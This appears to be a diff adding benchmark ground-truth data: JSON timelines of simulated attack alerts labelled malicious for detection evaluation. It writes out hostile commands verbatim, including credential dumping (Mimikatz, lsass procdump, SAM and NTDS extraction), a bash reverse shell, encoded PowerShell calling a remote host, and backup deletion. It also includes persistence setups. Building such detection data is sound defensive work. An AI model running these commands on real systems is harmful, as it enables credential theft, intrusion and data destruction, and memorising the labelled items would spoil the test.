@@ -1,0 +1,2820 @@
+[
+  {
+    "timeline_id": "064df2c7-6cdd-437f-8beb-0a242f552672",
+    "grouping_key": "HOST-FIN-01:fin_analyst",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M01-CredDump-Mimikatz",
+    "total_events": 2,
+    "start_time": "2026-11-05T08:00:00+00:00",
+    "end_time": "2026-11-05T08:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T08:00:00+00:00",
+        "original_record": {
+          "ProcessName": "powershell.exe",
+          "CommandLine": "powershell.exe -enc aW52b2tlLW1pbWlrYXR6 sekurlsa::logonpasswords",
+          "ParentProcessName": "cmd.exe",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-FIN-01",
+          "user": "fin_analyst"
+        },
+        "extracted_indicators": [
+          "powershell.exe",
+          "mimikatz"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T08:03:00+00:00",
+        "original_record": {
+          "ProcessName": "procdump64.exe",
+          "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp",
+          "ParentProcessName": "powershell.exe",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-FIN-01",
+          "user": "fin_analyst"
+        },
+        "extracted_indicators": [
+          "procdump64.exe",
+          "lsass.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "b99261c5-2083-42b9-82f1-cf4d4390d473",
+    "grouping_key": "HOST-DEV-02:dev_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M02-CredDump-LsassProcdump",
+    "total_events": 2,
+    "start_time": "2026-11-05T09:00:00+00:00",
+    "end_time": "2026-11-05T09:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T09:00:00+00:00",
+        "original_record": {
+          "ProcessName": "cmd.exe",
+          "CommandLine": "cmd.exe /c procdump.exe -ma lsass.exe lsass.dmp",
+          "User": "dev_user",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-DEV-02",
+          "user": "dev_user"
+        },
+        "extracted_indicators": [
+          "procdump.exe",
+          "lsass.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "FileCreate",
+        "timestamp": "2026-11-05T09:03:00+00:00",
+        "original_record": {
+          "Path": "C:\\Windows\\Temp\\lsass.dmp",
+          "Size": 85400000,
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-DEV-02",
+          "user": "dev_user"
+        },
+        "extracted_indicators": [
+          "lsass.dmp"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "46c764f7-3b45-4ba5-9cd2-f85157c15e40",
+    "grouping_key": "HOST-WS-05:admin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M03-CredDump-SAM-RegSave",
+    "total_events": 2,
+    "start_time": "2026-11-05T10:00:00+00:00",
+    "end_time": "2026-11-05T10:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T10:00:00+00:00",
+        "original_record": {
+          "ProcessName": "reg.exe",
+          "CommandLine": "reg.exe save HKLM\\SAM C:\\temp\\sam.save",
+          "User": "admin",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-05",
+          "user": "admin"
+        },
+        "extracted_indicators": [
+          "reg.exe",
+          "sam.save"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T10:03:00+00:00",
+        "original_record": {
+          "ProcessName": "reg.exe",
+          "CommandLine": "reg.exe save HKLM\\SYSTEM C:\\temp\\sys.save",
+          "User": "admin",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-05",
+          "user": "admin"
+        },
+        "extracted_indicators": [
+          "reg.exe",
+          "sys.save"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "e79c6499-4246-40a0-b096-81312c8a85c6",
+    "grouping_key": "HOST-DC-01:DomainAdmin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M04-CredDump-Ntdsutil",
+    "total_events": 1,
+    "start_time": "2026-11-05T11:00:00+00:00",
+    "end_time": "2026-11-05T11:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T11:00:00+00:00",
+        "original_record": {
+          "ProcessName": "ntdsutil.exe",
+          "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds\" q q",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-DC-01",
+          "user": "DomainAdmin"
+        },
+        "extracted_indicators": [
+          "ntdsutil.exe",
+          "ntds.dit"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "fc599684-31da-4b7a-973e-af96e5b6df1e",
+    "grouping_key": "HOST-HR-03:hr_rep",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M05-C2-CobaltStrike-Beacon",
+    "total_events": 2,
+    "start_time": "2026-11-05T12:00:00+00:00",
+    "end_time": "2026-11-05T12:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T12:00:00+00:00",
+        "original_record": {
+          "ProcessName": "rundll32.exe",
+          "CommandLine": "rundll32.exe C:\\Users\\Public\\beacon.dll,Start",
+          "User": "hr_rep",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-HR-03",
+          "user": "hr_rep"
+        },
+        "extracted_indicators": [
+          "beacon.dll"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-05T12:03:00+00:00",
+        "original_record": {
+          "DestinationIp": "185.220.101.5",
+          "DestinationPort": 443,
+          "Protocol": "tcp",
+          "BytesSent": 4096,
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-HR-03",
+          "user": "hr_rep"
+        },
+        "extracted_indicators": [
+          "185.220.101.5"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "92996db5-e814-4ac6-a4fa-83a6fa4b6e43",
+    "grouping_key": "HOST-EXEC-01:exec_vip",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M06-C2-DNS-Tunneling",
+    "total_events": 2,
+    "start_time": "2026-11-05T13:00:00+00:00",
+    "end_time": "2026-11-05T13:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-05T13:00:00+00:00",
+        "original_record": {
+          "Query": "xfa192.tunnel.c2badactor.com",
+          "RecordType": "TXT",
+          "Response": "base64payloadchunk",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-EXEC-01",
+          "user": "exec_vip"
+        },
+        "extracted_indicators": [
+          "c2badactor.com"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-05T13:03:00+00:00",
+        "original_record": {
+          "Query": "xfa193.tunnel.c2badactor.com",
+          "RecordType": "TXT",
+          "Response": "base64payloadchunk2",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-EXEC-01",
+          "user": "exec_vip"
+        },
+        "extracted_indicators": [
+          "c2badactor.com"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "abf37f7b-531f-467f-83ba-5ef30ede29fd",
+    "grouping_key": "HOST-WEB-PROD:www-data",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M07-C2-Metasploit-ReverseTCP",
+    "total_events": 2,
+    "start_time": "2026-11-05T14:00:00+00:00",
+    "end_time": "2026-11-05T14:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T14:00:00+00:00",
+        "original_record": {
+          "ProcessName": "bash",
+          "CommandLine": "bash -c 'bash -i >& /dev/tcp/194.26.29.112/4444 0>&1'",
+          "User": "www-data",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WEB-PROD",
+          "user": "www-data"
+        },
+        "extracted_indicators": [
+          "194.26.29.112"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-05T14:03:00+00:00",
+        "original_record": {
+          "DestinationIp": "194.26.29.112",
+          "DestinationPort": 4444,
+          "Protocol": "tcp",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WEB-PROD",
+          "user": "www-data"
+        },
+        "extracted_indicators": [
+          "194.26.29.112"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "e868c4f4-59de-4bd9-b45c-f4aece85da69",
+    "grouping_key": "HOST-WS-08:sales_rep",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M08-C2-Empire-HttpAgent",
+    "total_events": 1,
+    "start_time": "2026-11-05T15:00:00+00:00",
+    "end_time": "2026-11-05T15:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T15:00:00+00:00",
+        "original_record": {
+          "ProcessName": "powershell.exe",
+          "CommandLine": "powershell.exe -noP -sta -w 1 -enc WwBTAHkAcwB0AGUAbQAu... http://195.154.20.5:8080/news.php",
+          "User": "sales_rep",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-08",
+          "user": "sales_rep"
+        },
+        "extracted_indicators": [
+          "195.154.20.5"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "51bdcb56-0539-46df-92f1-d833b693498c",
+    "grouping_key": "HOST-STORAGE-01:backup_admin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M09-Ransomware-VSSDelete",
+    "total_events": 2,
+    "start_time": "2026-11-05T16:00:00+00:00",
+    "end_time": "2026-11-05T16:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T16:00:00+00:00",
+        "original_record": {
+          "ProcessName": "vssadmin.exe",
+          "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-STORAGE-01",
+          "user": "backup_admin"
+        },
+        "extracted_indicators": [
+          "vssadmin.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T16:03:00+00:00",
+        "original_record": {
+          "ProcessName": "wbadmin.exe",
+          "CommandLine": "wbadmin.exe delete catalog -quiet",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-STORAGE-01",
+          "user": "backup_admin"
+        },
+        "extracted_indicators": [
+          "wbadmin.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "301cb17e-537c-4d26-b217-77351182b4e5",
+    "grouping_key": "HOST-FS-02:admin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M10-Ransomware-BcdeditDisable",
+    "total_events": 2,
+    "start_time": "2026-11-05T17:00:00+00:00",
+    "end_time": "2026-11-05T17:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T17:00:00+00:00",
+        "original_record": {
+          "ProcessName": "bcdedit.exe",
+          "CommandLine": "bcdedit.exe /set {default} recoveryenabled No",
+          "User": "admin",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-FS-02",
+          "user": "admin"
+        },
+        "extracted_indicators": [
+          "bcdedit.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T17:03:00+00:00",
+        "original_record": {
+          "ProcessName": "bcdedit.exe",
+          "CommandLine": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
+          "User": "admin",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-FS-02",
+          "user": "admin"
+        },
+        "extracted_indicators": [
+          "bcdedit.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "d13e3c58-e79c-4557-9a0c-b48607b16fcf",
+    "grouping_key": "HOST-FIN-02:fin_clerk",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M11-Ransomware-MassEncryption",
+    "total_events": 3,
+    "start_time": "2026-11-05T18:00:00+00:00",
+    "end_time": "2026-11-05T18:06:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "FileCreate",
+        "timestamp": "2026-11-05T18:00:00+00:00",
+        "original_record": {
+          "Path": "C:\\Share\\Finance\\Q3_report.xlsx.locked",
+          "Action": "Encrypted",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-FIN-02",
+          "user": "fin_clerk"
+        },
+        "extracted_indicators": [
+          ".locked"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "FileCreate",
+        "timestamp": "2026-11-05T18:03:00+00:00",
+        "original_record": {
+          "Path": "C:\\Share\\Finance\\Payroll_2026.pdf.locked",
+          "Action": "Encrypted",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-FIN-02",
+          "user": "fin_clerk"
+        },
+        "extracted_indicators": [
+          ".locked"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "FileCreate",
+        "timestamp": "2026-11-05T18:06:00+00:00",
+        "original_record": {
+          "Path": "C:\\Share\\Finance\\HOW_TO_DECRYPT.txt",
+          "Action": "RansomNote",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-FIN-02",
+          "user": "fin_clerk"
+        },
+        "extracted_indicators": [
+          "HOW_TO_DECRYPT.txt"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "fcb44901-b1bf-48f5-93d6-ab83283c9f95",
+    "grouping_key": "HOST-DC-02:DomainAdmin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M12-Lateral-PsExec",
+    "total_events": 2,
+    "start_time": "2026-11-05T19:00:00+00:00",
+    "end_time": "2026-11-05T19:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ServiceInstall",
+        "timestamp": "2026-11-05T19:00:00+00:00",
+        "original_record": {
+          "ServiceName": "PSEXESVC",
+          "BinaryPath": "C:\\Windows\\PSEXESVC.exe",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-DC-02",
+          "user": "DomainAdmin"
+        },
+        "extracted_indicators": [
+          "PSEXESVC.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T19:03:00+00:00",
+        "original_record": {
+          "ProcessName": "cmd.exe",
+          "CommandLine": "cmd.exe /c whoami",
+          "ParentProcessName": "PSEXESVC.exe",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-DC-02",
+          "user": "DomainAdmin"
+        },
+        "extracted_indicators": [
+          "PSEXESVC.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "85bacafb-5db2-478f-9e35-d4b297352237",
+    "grouping_key": "HOST-WS-12:it_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M13-Lateral-WMI-Process",
+    "total_events": 1,
+    "start_time": "2026-11-05T20:00:00+00:00",
+    "end_time": "2026-11-05T20:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T20:00:00+00:00",
+        "original_record": {
+          "ProcessName": "wmic.exe",
+          "CommandLine": "wmic.exe /node:10.0.1.25 process call create \"cmd.exe /c powershell.exe -enc ...\"",
+          "User": "it_ops",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-12",
+          "user": "it_ops"
+        },
+        "extracted_indicators": [
+          "10.0.1.25"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "5d5f1d67-fc6a-4573-8096-8770aa577b9f",
+    "grouping_key": "HOST-DB-PROD:db_admin",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M14-Lateral-WinRM-Exec",
+    "total_events": 1,
+    "start_time": "2026-11-05T21:00:00+00:00",
+    "end_time": "2026-11-05T21:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-05T21:00:00+00:00",
+        "original_record": {
+          "ProcessName": "winrs.exe",
+          "CommandLine": "winrs.exe -r:HOST-DB-PROD cmd.exe /c whoami /all",
+          "User": "compromised_admin",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-DB-PROD",
+          "user": "db_admin"
+        },
+        "extracted_indicators": [
+          "winrs.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "c3ac73e5-03fd-4adc-9017-66a3a8e45727",
+    "grouping_key": "HOST-WS-15:analyst",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M15-Lateral-PassTheHash",
+    "total_events": 1,
+    "start_time": "2026-11-05T22:00:00+00:00",
+    "end_time": "2026-11-05T22:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "SecurityAuth",
+        "timestamp": "2026-11-05T22:00:00+00:00",
+        "original_record": {
+          "EventID": 4624,
+          "LogonType": 9,
+          "LogonProcessName": "seclogo",
+          "AuthenticationPackage": "Negotiate",
+          "IpAddress": "10.0.1.99",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-15",
+          "user": "analyst"
+        },
+        "extracted_indicators": [
+          "10.0.1.99"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "64012450-8372-446e-b380-e6fde4170368",
+    "grouping_key": "HOST-DC-01:krbtgt_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M16-Lateral-DCSync",
+    "total_events": 2,
+    "start_time": "2026-11-05T23:00:00+00:00",
+    "end_time": "2026-11-05T23:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "SecurityAuth",
+        "timestamp": "2026-11-05T23:00:00+00:00",
+        "original_record": {
+          "EventID": 4769,
+          "ServiceName": "krbtgt",
+          "TicketOptions": "0x40810000",
+          "ClientAddress": "10.0.1.45",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-DC-01",
+          "user": "krbtgt_user"
+        },
+        "extracted_indicators": [
+          "10.0.1.45"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ReplicationRpc",
+        "timestamp": "2026-11-05T23:03:00+00:00",
+        "original_record": {
+          "Operation": "DS-Replication-Get-Changes-All",
+          "ClientAddress": "10.0.1.45",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-DC-01",
+          "user": "krbtgt_user"
+        },
+        "extracted_indicators": [
+          "mimikatz"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "eeada56d-c7b1-42e2-9826-2c4d70d4c634",
+    "grouping_key": "HOST-WS-02:user_b",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M17-Persistence-ScheduledTask",
+    "total_events": 1,
+    "start_time": "2026-11-06T00:00:00+00:00",
+    "end_time": "2026-11-06T00:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T00:00:00+00:00",
+        "original_record": {
+          "ProcessName": "schtasks.exe",
+          "CommandLine": "schtasks.exe /create /tn \"EdgeUpdater\" /tr \"C:\\Users\\Public\\backdoor.exe\" /sc onlogon",
+          "User": "user_b",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-02",
+          "user": "user_b"
+        },
+        "extracted_indicators": [
+          "backdoor.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "3f10f685-8be6-4ed9-b5ef-a77aa0841f47",
+    "grouping_key": "HOST-WS-03:user_c",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M18-Persistence-RunKey",
+    "total_events": 1,
+    "start_time": "2026-11-06T01:00:00+00:00",
+    "end_time": "2026-11-06T01:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T01:00:00+00:00",
+        "original_record": {
+          "ProcessName": "reg.exe",
+          "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /t REG_SZ /d \"C:\\Temp\\agent.exe\"",
+          "User": "user_c",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-03",
+          "user": "user_c"
+        },
+        "extracted_indicators": [
+          "agent.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "398b2ea7-7419-472a-aa6b-8f0e04373338",
+    "grouping_key": "HOST-APP-01:service_mgr",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M19-Persistence-ServiceInstall",
+    "total_events": 1,
+    "start_time": "2026-11-06T02:00:00+00:00",
+    "end_time": "2026-11-06T02:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T02:00:00+00:00",
+        "original_record": {
+          "ProcessName": "sc.exe",
+          "CommandLine": "sc.exe create WindowsAudioFix binPath= \"C:\\Windows\\Temp\\svc.exe\" start= auto",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-APP-01",
+          "user": "service_mgr"
+        },
+        "extracted_indicators": [
+          "svc.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "a6e8c915-629a-4c86-bba0-640babc40642",
+    "grouping_key": "HOST-WS-04:accountant",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M20-Persistence-StartupFolder",
+    "total_events": 1,
+    "start_time": "2026-11-06T03:00:00+00:00",
+    "end_time": "2026-11-06T03:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "FileCreate",
+        "timestamp": "2026-11-06T03:00:00+00:00",
+        "original_record": {
+          "Path": "C:\\Users\\accountant\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.vbs",
+          "User": "accountant",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-04",
+          "user": "accountant"
+        },
+        "extracted_indicators": [
+          "launcher.vbs"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "3666a661-5540-4a1a-8eef-39f1d3dcceaf",
+    "grouping_key": "HOST-WS-09:intern",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M21-Discovery-AD-Admins",
+    "total_events": 2,
+    "start_time": "2026-11-06T04:00:00+00:00",
+    "end_time": "2026-11-06T04:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T04:00:00+00:00",
+        "original_record": {
+          "ProcessName": "net.exe",
+          "CommandLine": "net.exe group \"Domain Admins\" /domain",
+          "User": "intern",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-09",
+          "user": "intern"
+        },
+        "extracted_indicators": [
+          "Domain Admins"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T04:03:00+00:00",
+        "original_record": {
+          "ProcessName": "nltest.exe",
+          "CommandLine": "nltest.exe /dclist:corp.internal",
+          "User": "intern",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-09",
+          "user": "intern"
+        },
+        "extracted_indicators": [
+          "corp.internal"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "a2725f06-b774-49c2-9375-9ab43c8ef803",
+    "grouping_key": "HOST-WS-11:guest_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M22-Discovery-NetworkPortScan",
+    "total_events": 3,
+    "start_time": "2026-11-06T05:00:00+00:00",
+    "end_time": "2026-11-06T05:06:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-06T05:00:00+00:00",
+        "original_record": {
+          "DestinationIp": "10.0.1.1",
+          "DestinationPort": 22,
+          "Action": "TCP_SYN",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-11",
+          "user": "guest_user"
+        },
+        "extracted_indicators": [
+          "10.0.1.1"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-06T05:03:00+00:00",
+        "original_record": {
+          "DestinationIp": "10.0.1.1",
